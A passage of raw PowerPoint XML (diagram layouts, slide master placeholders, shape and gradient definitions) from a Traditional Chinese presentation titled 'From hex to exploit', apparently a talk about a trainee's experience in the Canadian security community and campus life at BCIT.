        <dgm:pt modelId="12" type="node">
          <dgm:prSet phldr="1"/>
        </dgm:pt>
        <dgm:pt modelId="2" type="node">
          <dgm:prSet phldr="1"/>
        </dgm:pt>
        <dgm:pt modelId="21" type="node">
          <dgm:prSet phldr="1"/>
        </dgm:pt>
        <dgm:pt modelId="22" type="node">
          <dgm:prSet phldr="1"/>
        </dgm:pt>
        <dgm:pt modelId="3" type="node">
          <dgm:prSet phldr="1"/>
        </dgm:pt>
        <dgm:pt modelId="31" type="node">
          <dgm:prSet phldr="1"/>
        </dgm:pt>
        <dgm:pt modelId="32" type="node">
          <dgm:prSet phldr="1"/>
        </dgm:pt>
      </dgm:ptLst>
      <dgm:cxnLst>
        <dgm:cxn modelId="4" type="parOf" srcId="0" destId="1" srcOrd="0" destOrd="0"/>
        <dgm:cxn modelId="5" type="parOf" srcId="0" destId="2" srcOrd="1" destOrd="0"/>
        <dgm:cxn modelId="6" type="parOf" srcId="0" destId="3" srcOrd="2" destOrd="0"/>
        <dgm:cxn modelId="13" type="parOf" srcId="1" destId="11" srcOrd="0" destOrd="0"/>
        <dgm:cxn modelId="14" type="parOf" srcId="1" destId="12" srcOrd="1" destOrd="0"/>
        <dgm:cxn modelId="23" type="parOf" srcId="2" destId="21" srcOrd="0" destOrd="0"/>
        <dgm:cxn modelId="24" type="parOf" srcId="2" destId="22" srcOrd="1" destOrd="0"/>
        <dgm:cxn modelId="33" type="parOf" srcId="3" destId="31" srcOrd="0" destOrd="0"/>
        <dgm:cxn modelId="34" type="parOf" srcId="3" destId="32" srcOrd="1" destOrd="0"/>
      </dgm:cxnLst>
      <dgm:bg/>
      <dgm:whole/>
    </dgm:dataModel>
  </dgm:sampData>
  <dgm:styleData>
    <dgm:dataModel>
      <dgm:ptLst>
        <dgm:pt modelId="0" type="doc"/>
        <dgm:pt modelId="1" type="node"/>
      </dgm:ptLst>
      <dgm:cxnLst>
        <dgm:cxn modelId="4" type="parOf" srcId="0" destId="1" srcOrd="0" destOrd="0"/>
      </dgm:cxnLst>
      <dgm:bg/>
      <dgm:whole/>
    </dgm:dataModel>
  </dgm:styleData>
  <dgm:clrData>
    <dgm:dataModel>
      <dgm:ptLst>
        <dgm:pt modelId="0" type="doc"/>
        <dgm:pt modelId="1" type="node"/>
        <dgm:pt modelId="11" type="node"/>
        <dgm:pt modelId="2" type="node"/>
        <dgm:pt modelId="21" type="node"/>
        <dgm:pt modelId="3" type="node"/>
        <dgm:pt modelId="31" type="node"/>
        <dgm:pt modelId="4" type="node"/>
        <dgm:pt modelId="41" type="node"/>
      </dgm:ptLst>
      <dgm:cxnLst>
        <dgm:cxn modelId="5" type="parOf" srcId="0" destId="1" srcOrd="0" destOrd="0"/>
        <dgm:cxn modelId="6" type="parOf" srcId="0" destId="2" srcOrd="1" destOrd="0"/>
        <dgm:cxn modelId="7" type="parOf" srcId="0" destId="3" srcOrd="2" destOrd="0"/>
        <dgm:cxn modelId="8" type="parOf" srcId="0" destId="4" srcOrd="3" destOrd="0"/>
        <dgm:cxn modelId="13" type="parOf" srcId="1" destId="11" srcOrd="0" destOrd="0"/>
        <dgm:cxn modelId="23" type="parOf" srcId="2" destId="21" srcOrd="0" destOrd="0"/>
        <dgm:cxn modelId="33" type="parOf" srcId="3" destId="31" srcOrd="0" destOrd="0"/>
        <dgm:cxn modelId="43" type="parOf" srcId="4" destId="41" srcOrd="0" destOrd="0"/>
      </dgm:cxnLst>
      <dgm:bg/>
      <dgm:whole/>
    </dgm:dataModel>
  </dgm:clrData>
  <dgm:layoutNode name="linearFlow">
    <dgm:alg type="lin">
      <dgm:param type="linDir" val="fromT"/>
      <dgm:param type="nodeHorzAlign" val="l"/>
    </dgm:alg>
    <dgm:shape rot="0.000000" type="none" r:blip="" blipPhldr="0" lkTxEntry="0" zOrderOff="0" hideGeom="0">
      <dgm:adjLst/>
    </dgm:shape>
    <dgm:presOf/>
    <dgm:constrLst>
      <dgm:constr type="h" for="ch" forName="composite" ptType="all" refPtType="all" refType="h" refFor="self" op="none" fact="1.000000" val="0"/>
      <dgm:constr type="w" for="ch" forName="composite" ptType="all" refPtType="all" refType="w" refFor="self" op="none" fact="1.000000" val="0"/>
      <dgm:constr type="h" for="des" forName="parentText" ptType="all" refPtType="all" refType="none" refFor="self" op="equ" fact="1.000000" val="0"/>
      <dgm:constr type="h" for="ch" forName="sp" ptType="all" refPtType="all" refType="none" refFor="self" op="none" fact="1.000000" val="-14.880000000000001"/>
      <dgm:constr type="h" for="ch" forName="sp" ptType="all" refPtType="all" refType="w" refFor="des" refForName="parentText" op="gte" fact="-0.300000" val="0"/>
      <dgm:constr type="primFontSz" for="des" forName="parentText" ptType="all" refPtType="all" refType="none" refFor="self" op="equ" fact="1.000000" val="65"/>
      <dgm:constr type="primFontSz" for="des" forName="descendantText" ptType="all" refPtType="all" refType="none" refFor="self" op="equ" fact="1.000000" val="65"/>
    </dgm:constrLst>
    <dgm:ruleLst/>
    <dgm:varLst>
      <dgm:dir val="norm"/>
      <dgm:animLvl val="lvl"/>
      <dgm:resizeHandles val="exact"/>
    </dgm:varLst>
    <dgm:forEach name="Name0" axis="ch" ptType="node">
      <dgm:layoutNode name="composite">
        <dgm:alg type="composite"/>
        <dgm:shape rot="0.000000" type="none" r:blip="" blipPhldr="0" lkTxEntry="0" zOrderOff="0" hideGeom="0">
          <dgm:adjLst/>
        </dgm:shape>
        <dgm:presOf/>
        <dgm:ruleLst/>
        <dgm:choose name="Name1">
          <dgm:if name="Name2" func="var" arg="dir" op="equ" val="norm">
            <dgm:constrLst>
              <dgm:constr type="t" for="ch" forName="parentText" ptType="all" refPtType="all" refType="none" refFor="self" op="none" fact="1.000000" val="0"/>
              <dgm:constr type="l" for="ch" forName="parentText" ptType="all" refPtType="all" refType="none" refFor="self" op="none" fact="1.000000" val="0"/>
              <dgm:constr type="w" for="ch" forName="parentText" ptType="all" refPtType="all" refType="w" refFor="self" op="none" fact="0.400000" val="0"/>
              <dgm:constr type="h" for="ch" forName="parentText" ptType="all" refPtType="all" refType="h" refFor="self" op="none" fact="1.000000" val="0"/>
              <dgm:constr type="w" for="ch" forName="parentText" ptType="all" refPtType="all" refType="w" refFor="self" op="lte" fact="0.500000" val="0"/>
              <dgm:constr type="w" for="ch" forName="parentText" ptType="all" refPtType="all" refType="h" refFor="ch" refForName="parentText" op="lte" fact="0.700000" val="0"/>
              <dgm:constr type="h" for="ch" forName="parentText" ptType="all" refPtType="all" refType="w" refFor="ch" refForName="parentText" op="lte" fact="3.000000" val="0"/>
              <dgm:constr type="l" for="ch" forName="descendantText" ptType="all" refPtType="all" refType="w" refFor="ch" refForName="parentText" op="none" fact="1.000000" val="0"/>
              <dgm:constr type="w" for="ch" forName="descendantText" ptType="all" refPtType="all" refType="w" refFor="self" op="none" fact="1.000000" val="0"/>
              <dgm:constr type="wOff" for="ch" forName="descendantText" ptType="all" refPtType="all" refType="w" refFor="ch" refForName="parentText" op="none" fact="-1.000000" val="0"/>
              <dgm:constr type="t" for="ch" forName="descendantText" ptType="all" refPtType="all" refType="none" refFor="self" op="none" fact="1.000000" val="0"/>
              <dgm:constr type="b" for="ch" forName="descendantText" ptType="all" refPtType="all" refType="h" refFor="ch" refForName="parentText" op="none" fact="1.000000" val="0"/>
              <dgm:constr type="bOff" for="ch" forName="descendantText" ptType="all" refPtType="all" refType="w" refFor="ch" refForName="parentText" op="none" fact="-0.500000" val="0"/>
            </dgm:constrLst>
          </dgm:if>
          <dgm:else name="Name3">
            <dgm:constrLst>
              <dgm:constr type="t" for="ch" forName="parentText" ptType="all" refPtType="all" refType="none" refFor="self" op="none" fact="1.000000" val="0"/>
              <dgm:constr type="r" for="ch" forName="parentText" ptType="all" refPtType="all" refType="w" refFor="self" op="none" fact="1.000000" val="0"/>
              <dgm:constr type="w" for="ch" forName="parentText" ptType="all" refPtType="all" refType="w" refFor="self" op="none" fact="0.400000" val="0"/>
              <dgm:constr type="h" for="ch" forName="parentText" ptType="all" refPtType="all" refType="h" refFor="self" op="none" fact="1.000000" val="0"/>
              <dgm:constr type="w" for="ch" forName="parentText" ptType="all" refPtType="all" refType="w" refFor="self" op="lte" fact="0.500000" val="0"/>
              <dgm:constr type="w" for="ch" forName="parentText" ptType="all" refPtType="all" refType="h" refFor="ch" refForName="parentText" op="lte" fact="0.700000" val="0"/>
              <dgm:constr type="h" for="ch" forName="parentText" ptType="all" refPtType="all" refType="w" refFor="ch" refForName="parentText" op="lte" fact="3.000000" val="0"/>
              <dgm:constr type="l" for="ch" forName="descendantText" ptType="all" refPtType="all" refType="none" refFor="self" op="none" fact="1.000000" val="0"/>
              <dgm:constr type="w" for="ch" forName="descendantText" ptType="all" refPtType="all" refType="w" refFor="self" op="none" fact="1.000000" val="0"/>
              <dgm:constr type="wOff" for="ch" forName="descendantText" ptType="all" refPtType="all" refType="w" refFor="ch" refForName="parentText" op="none" fact="-1.000000" val="0"/>
              <dgm:constr type="t" for="ch" forName="descendantText" ptType="all" refPtType="all" refType="none" refFor="self" op="none" fact="1.000000" val="0"/>
              <dgm:constr type="b" for="ch" forName="descendantText" ptType="all" refPtType="all" refType="h" refFor="ch" refForName="parentText" op="none" fact="1.000000" val="0"/>
              <dgm:constr type="bOff" for="ch" forName="descendantText" ptType="all" refPtType="all" refType="w" refFor="ch" refForName="parentText" op="none" fact="-0.500000" val="0"/>
            </dgm:constrLst>
          </dgm:else>
        </dgm:choose>
        <dgm:layoutNode name="parentText" styleLbl="alignNode1">
          <dgm:alg type="tx"/>
          <dgm:shape rot="90.000000" type="chevron" r:blip="" blipPhldr="0" lkTxEntry="0" zOrderOff="0" hideGeom="0">
            <dgm:adjLst/>
          </dgm:shape>
          <dgm:presOf axis="self" ptType="node"/>
          <dgm:constrLst>
            <dgm:constr type="lMarg" for="self" ptType="all" refPtType="all" refType="primFontSz" refFor="self" op="none" fact="0.050000" val="0"/>
            <dgm:constr type="rMarg" for="self" ptType="all" refPtType="all" refType="primFontSz" refFor="self" op="none" fact="0.050000" val="0"/>
            <dgm:constr type="tMarg" for="self" ptType="all" refPtType="all" refType="primFontSz" refFor="self" op="none" fact="0.050000" val="0"/>
            <dgm:constr type="bMarg" for="self" ptType="all" refPtType="all" refType="primFontSz" refFor="self" op="none" fact="0.050000" val="0"/>
          </dgm:constrLst>
          <dgm:ruleLst>
            <dgm:rule type="h" for="self" ptType="all" val="100" fact="NaN" max="NaN"/>
            <dgm:rule type="primFontSz" for="self" ptType="all" val="24" fact="NaN" max="NaN"/>
            <dgm:rule type="h" for="self" ptType="all" val="110" fact="NaN" max="NaN"/>
            <dgm:rule type="primFontSz" for="self" ptType="all" val="18" fact="NaN" max="NaN"/>
            <dgm:rule type="h" for="self" ptType="all" val="INF" fact="NaN" max="NaN"/>
            <dgm:rule type="primFontSz" for="self" ptType="all" val="5" fact="NaN" max="NaN"/>
          </dgm:ruleLst>
          <dgm:varLst>
            <dgm:chMax val="1"/>
            <dgm:bulletEnabled val="1"/>
          </dgm:varLst>
        </dgm:layoutNode>
        <dgm:layoutNode name="descendantText" styleLbl="alignAcc1">
          <dgm:presOf axis="des" ptType="node"/>
          <dgm:ruleLst>
            <dgm:rule type="primFontSz" for="self" ptType="all" val="5" fact="NaN" max="NaN"/>
          </dgm:ruleLst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rot="90.000000" type="round2SameRect" r:blip="" blipPhldr="0" lkTxEntry="0" zOrderOff="0" hideGeom="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rot="-90.000000" type="round2SameRect" r:blip="" blipPhldr="0" lkTxEntry="0" zOrderOff="0" hideGeom="0">
                <dgm:adjLst/>
              </dgm:shape>
            </dgm:else>
          </dgm:choose>
          <dgm:choose name="Name7">
            <dgm:if name="Name8" func="var" arg="dir" op="equ" val="norm">
              <dgm:constrLst>
                <dgm:constr type="secFontSz" for="self" ptType="all" refPtType="all" refType="primFontSz" refFor="self" op="none" fact="1.000000" val="0"/>
                <dgm:constr type="tMarg" for="self" ptType="all" refPtType="all" refType="primFontSz" refFor="self" op="none" fact="0.050000" val="0"/>
                <dgm:constr type="bMarg" for="self" ptType="all" refPtType="all" refType="primFontSz" refFor="self" op="none" fact="0.050000" val="0"/>
                <dgm:constr type="rMarg" for="self" ptType="all" refPtType="all" refType="primFontSz" refFor="self" op="none" fact="0.050000" val="0"/>
              </dgm:constrLst>
            </dgm:if>
            <dgm:else name="Name9">
              <dgm:constrLst>
                <dgm:constr type="secFontSz" for="self" ptType="all" refPtType="all" refType="primFontSz" refFor="self" op="none" fact="1.000000" val="0"/>
                <dgm:constr type="tMarg" for="self" ptType="all" refPtType="all" refType="primFontSz" refFor="self" op="none" fact="0.050000" val="0"/>
                <dgm:constr type="bMarg" for="self" ptType="all" refPtType="all" refType="primFontSz" refFor="self" op="none" fact="0.050000" val="0"/>
                <dgm:constr type="lMarg" for="self" ptType="all" refPtType="all" refType="primFontSz" refFor="self" op="none" fact="0.050000" val="0"/>
              </dgm:constrLst>
            </dgm:else>
          </dgm:choose>
        </dgm:layoutNode>
      </dgm:layoutNode>
      <dgm:forEach name="Name10" axis="followSib" ptType="sibTrans" cnt="1">
        <dgm:layoutNode name="sp">
          <dgm:alg type="sp"/>
          <dgm:shape rot="0.000000" type="none" r:blip="" blipPhldr="0" lkTxEntry="0" zOrderOff="0" hideGeom="0">
            <dgm:adjLst/>
          </dgm:shape>
          <dgm:presOf axis="self"/>
          <dgm:constrLst>
            <dgm:constr type="w" for="self" ptType="all" refPtType="all" refType="none" refFor="self" op="none" fact="1.000000" val="1"/>
            <dgm:constr type="h" for="self" ptType="all" refPtType="all" refType="none" refFor="self" op="none" fact="1.000000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849529" name="標題佔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952046279" name="日期佔位符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zh-TW"/>
              <a:t>10/30/2013</a:t>
            </a:fld>
            <a:endParaRPr lang="zh-TW"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2116981440" name="幻燈片圖像佔位符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TW"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="688064100" name="備註 佔位符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TW"/>
              <a:t>單擊以編輯主文本樣式</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-TW"/>
              <a:t>第二級</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-TW"/>
              <a:t>三級</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr lvl="3">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-TW"/>
              <a:t>第四級</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr lvl="4">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-TW"/>
              <a:t>第五級</a:t>
            </a:r>
            <a:endParaRPr lang="zh-TW"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="877924413" name="頁腳佔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491472880" name="幻燈片編號佔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zh-TW"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64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33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8274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FE40FB-15B6-A004-290C-560E0FC532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769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758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2212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92E511-D09A-4FE3-EA7E-9788AA4557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35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5520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2213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56902C-D445-BCFA-EC0F-76260762B4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0491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2408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29130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BD2466-1AE6-30BB-7B40-092CD5345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71545" name="幻燈片圖像佔位符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333201" name="備註 佔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TW">
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="127522432" name="幻燈片編號佔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zh-TW"/>
              <a:t>1</a:t>
            </a:fld>
            <a:endParaRPr lang="zh-TW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7847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4012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1736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B6B278-7A5A-4958-3CD0-C657D1067B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6876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2864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723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B477F1-AD50-890F-26EA-1028D1277D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61343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8479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54225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047585-63A4-C07C-6A7B-EBAFA1A24E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3747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7430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277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90D32E-D310-5759-4C9C-3FDEEF227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9291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9792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832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258A32-7BFF-CDE6-A7BC-51D7F3B4A9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033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5356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233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296310-1052-436C-D9E7-26B287C2A5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3100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66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34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FB782E-2BB5-6EA8-C020-86B37F99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5856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9633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1396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0D9EDD-22FA-5BA8-B4FE-F74E8C68C0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2558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7999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3461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3E4A2D-1577-E0F5-DB93-0023631D5D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6732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96410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56335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6BF56B-FF8A-C6D3-0384-C16B34E99F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651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350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7290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39626C-5143-8039-A918-119CC665FB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7585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9464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292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14A8C0-22A1-9EE0-26DE-DCB31A889D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88790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03236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712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4B6CA6-BD6C-7415-B3F4-158277F804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17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0051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939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D88431-CCEE-55CF-D9DD-CA9491AEE3F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351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2082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6185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E696B6-D724-4F52-D557-5B1C8E4D17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4970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080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2788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814EA-3D24-F59A-354A-FD12C929CC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6804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81748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54554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5482D0-3331-16A2-62FD-928B159B6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4103CE-F639-1553-521A-2131AB4FB4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7906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4310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39469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3DE06E-6FA7-4C36-3977-6DACB6A3E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3088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64366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486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7CFDB1-7974-843B-14B0-93C52A8901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9941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69537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2728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188B5F-FBFB-B846-F888-31548FFC52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3787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10917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132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5DEACF-4D44-2C04-5E08-C0BD0AB1EC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2622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64387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093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5AC0BB-8960-817A-EF3E-6461A0A23D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008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89437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02213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E44659-4711-D15A-2F07-328A2D1AEC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933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4895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579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4D4A06-84E4-0689-991E-0BE594B753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1579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39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0545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1FCA88-00CF-DCEE-DC12-62063FC43A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6255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95195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3777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16193F-2D13-1F28-FC9B-EB849D249F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0466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62757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50697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1926B2-5B40-91B1-66C6-1E00F39D89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572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722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4213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311697-AE6C-7384-0C77-DF8AE6974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107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5819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70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9920-A582-3028-B6FD-32C266B47D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0140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36205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99759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64D49D-3DCC-5CFD-C664-2412EAEABD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4050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05668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379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8C5A12-FD9F-43D5-2F01-2189550759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0900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78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127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17FE41-DB8D-284A-3F99-D106C640AD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97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04712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826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B5D6ED-EB53-C64E-7942-CB23638F34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14000">
              <a:schemeClr val="tx2"/>
            </a:gs>
            <a:gs pos="100000">
              <a:schemeClr val="tx2">
                <a:lumMod val="75000"/>
              </a:scheme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0168414" name="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 rot="0" flipH="0" flipV="0">
            <a:off x="-3046" y="9144"/>
            <a:ext cx="12198094" cy="6848854"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="588911002" name=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="0" flipH="0" flipV="0">
            <a:off x="6079" y="4051"/>
            <a:ext cx="12179837" cy="6849891"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:gradFill>
            <a:gsLst>
              <a:gs pos="1000">
                <a:schemeClr val="tx2">
                  <a:alpha val="23000"/>
                </a:schemeClr>
              </a:gs>
              <a:gs pos="75000">
                <a:schemeClr val="tx2">
                  <a:lumMod val="50000"/>
                  <a:alpha val="23000"/>
                </a:schemeClr>
              </a:gs>
            </a:gsLst>
            <a:path path="circle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568088176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3"/>
            <a:ext cx="9144000" cy="2387599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66132540" name="Subtitle 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="0" flipH="0" flipV="0">
            <a:off x="1527048" y="3602734"/>
            <a:ext cx="9144000" cy="1655760"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vertOverflow="overflow" horzOverflow="overflow" vert="horz" wrap="square" lIns="91440" tIns="274318" rIns="91440" bIns="45720" numCol="1" spcCol="0" rtlCol="0" fromWordArt="0" anchor="t" anchorCtr="0" forceAA="0" upright="0" compatLnSpc="0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8679748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8839688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17778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468650130" name="Rectangle 640957806"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="0" flipH="0" flipV="0">
            <a:off x="3570597" y="3530036"/>
            <a:ext cx="504000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tx2">
                <a:lumMod val="20000"/>
                <a:lumOff val="80000"/>
              </a:schemeClr>
            </a:gs>
            <a:gs pos="100000">
              <a:schemeClr val="bg1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18864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365123"/>
            <a:ext cx="10515600" cy="112157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38413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07989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8477417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4244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210198411" name="Rectangle 640957806"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="0" flipH="0" flipV="0">
            <a:off x="4703774" y="1486702"/>
            <a:ext cx="2776433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2">
            <a:alpha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25249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365123"/>
            <a:ext cx="10515600" cy="112157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81251302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955870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B14398F-3795-7DE0-858E-3925D44B3378}" type="datetimeFigureOut">
              <a:rPr/>
              <a:t/>
            </a:fld>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13796993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8931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D9411B4-B34A-E1DB-16D9-0D265777C9EB}" type="slidenum">
              <a:rPr/>
              <a:t/>
            </a:fld>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1316219658" name="Rectangle 640957806"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="0" flipH="0" flipV="0">
            <a:off x="838197" y="1486702"/>
            <a:ext cx="1051560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gradFill>
          <a:gsLst>
            <a:gs pos="5000">
              <a:schemeClr val="tx2"/>
            </a:gs>
            <a:gs pos="84000">
              <a:schemeClr val="tx2">
                <a:lumMod val="75000"/>
              </a:scheme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1484770" name="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 flipH="0" flipV="0">
            <a:off x="20621" y="8104"/>
            <a:ext cx="12216845" cy="6858000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1169895887" name="Title 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="831848" y="1399140"/>
            <a:ext cx="10515600" cy="285273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051568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8" y="4278863"/>
            <a:ext cx="10515600" cy="150018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771287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3067796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57157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2087051790" name="Rectangle 640957806"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="0" flipH="0" flipV="0">
            <a:off x="-10884" y="6017640"/>
            <a:ext cx="1221377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gradFill>
          <a:gsLst>
            <a:gs pos="0">
              <a:schemeClr val="tx2">
                <a:lumMod val="20000"/>
                <a:lumOff val="80000"/>
                <a:alpha val="44999"/>
              </a:schemeClr>
            </a:gs>
            <a:gs pos="80000">
              <a:srgbClr val="FFFFFF">
                <a:alpha val="44999"/>
              </a:srgbClr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636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8216562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4"/>
            <a:ext cx="5181599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247889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398008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0970687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5051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325757951" name="Rectangle 640957806"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="0" flipH="0" flipV="0">
            <a:off x="2070" y="6121172"/>
            <a:ext cx="12213769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gradFill>
          <a:gsLst>
            <a:gs pos="0">
              <a:schemeClr val="tx2">
                <a:lumMod val="20000"/>
                <a:lumOff val="80000"/>
                <a:alpha val="44999"/>
              </a:schemeClr>
            </a:gs>
            <a:gs pos="50000">
              <a:srgbClr val="FFFFFF">
                <a:alpha val="44999"/>
              </a:srgbClr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860624" name="Title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55345159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9786" y="1690686"/>
            <a:ext cx="5157784" cy="814385"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vertOverflow="overflow" horzOverflow="overflow" vert="horz" wrap="square" lIns="182880" tIns="182880" rIns="182880" bIns="9144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1271806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7" y="2505073"/>
            <a:ext cx="5157785" cy="3684587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81646396" name="Text Placeholder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="3"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm flipH="0" flipV="0">
            <a:off x="6172198" y="1690686"/>
            <a:ext cx="5183186" cy="814385"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vertOverflow="overflow" horzOverflow="overflow" vert="horz" wrap="square" lIns="182880" tIns="182880" rIns="182880" bIns="9144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47920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3"/>
            <a:ext cx="5183187" cy="3684587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8577190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9531362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6457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747229040" name="Rectangle 640957806"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="0" flipH="0" flipV="0">
            <a:off x="2330779" y="1690686"/>
            <a:ext cx="7530436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gradFill>
          <a:gsLst>
            <a:gs pos="0">
              <a:schemeClr val="tx2">
                <a:lumMod val="75000"/>
              </a:schemeClr>
            </a:gs>
            <a:gs pos="100000">
              <a:schemeClr val="tx2"/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881994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51316252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6" y="457198"/>
            <a:ext cx="6172200" cy="540384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143112261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754892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2093997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8217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093948311" name="Rectangle 640957806"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="0" flipH="0" flipV="0">
            <a:off x="838197" y="1984248"/>
            <a:ext cx="3933823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0">
              <a:schemeClr val="tx2"/>
            </a:gs>
            <a:gs pos="100000">
              <a:schemeClr val="tx2">
                <a:lumMod val="75000"/>
              </a:schemeClr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9823436" name="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 flipH="0" flipV="0">
            <a:off x="20620" y="8103"/>
            <a:ext cx="12216844" cy="6858000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1454238032" name="Title 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="838197" y="2455619"/>
            <a:ext cx="10515600" cy="1325561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  <a:lvl6pPr algn="ctr">
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr algn="ctr">
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr algn="ctr">
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr algn="ctr"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928095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50212868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68532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82641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22331919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70123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848955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27357536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4"/>
            <a:ext cx="6172200" cy="48736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4741180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879859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4047865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8203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19689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7364225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868842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2865887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2006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29997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8986932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4"/>
            <a:ext cx="7734299" cy="5811837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905602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7853327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8006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tx2">
                <a:lumMod val="20000"/>
                <a:lumOff val="80000"/>
              </a:schemeClr>
            </a:gs>
            <a:gs pos="100000">
              <a:srgbClr val="FFFFFF"/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13586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00452221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351338"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vertOverflow="overflow" horzOverflow="overflow" vert="horz" wrap="square" lIns="182880" tIns="182880" rIns="182880" bIns="91440" numCol="1" spcCol="0" rtlCol="0" fromWordArt="0" anchor="t" anchorCtr="0" forceAA="0" upright="0" compatLnSpc="0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3912772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41548297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587656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microsoft.com/office/2007/relationships/diagramDrawing" Target="../diagrams/drawing1.xml" /><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/diagramData" Target="../diagrams/data1.xml" /><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/diagramColors" Target="../diagrams/colors1.xml" /><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/diagramLayout" Target="../diagrams/layout1.xml" /><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/diagramQuickStyle" Target="../diagrams/quickStyle1.xml" /><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image5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9.jp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571940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From hex to exploit:</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="525771451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sz="4800" b="1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加拿大資安社群見習經驗分享</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="563856553" name=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="0" flipH="0" flipV="0">
            <a:off x="9736463" y="5459451"/>
            <a:ext cx="1402798" cy="5794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20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楊研晞</a:t>
            </a:r>
            <a:endParaRPr sz="3200">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="AR PL UKai TW"/>
              <a:cs typeface="AR PL UKai T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4828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BCIT &amp; 校園生活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412900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575026" y="466242"/>
